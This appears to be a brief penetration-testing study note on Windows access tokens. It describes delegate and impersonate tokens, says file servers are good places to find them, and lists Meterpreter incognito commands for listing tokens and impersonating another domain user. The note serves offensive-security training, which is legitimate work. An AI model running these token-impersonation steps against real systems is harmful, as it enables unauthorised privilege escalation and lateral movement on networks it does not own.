### Types of Token
* Delegate tokens - created for ‘interactive’ logons, such as logging into the machine or connecting to it via Remote Desktop.
* Impersonate tokens - created for ‘non-interactive’ sessions, such as attaching a network drive or a domain logon script.

The other great things about tokens? They persist until a reboot. When a user logs off, their delegate token is reported as an impersonate token, but will still hold all of the rights of a delegate token. Therefore, **file servers** are good places to find tokens. 

### How to impersonate with tokens

```
meterpreter > use incognito
```

```
list_tokens -u
```

```
impersonate_token els\\user
```

check user 
```
getuid
```
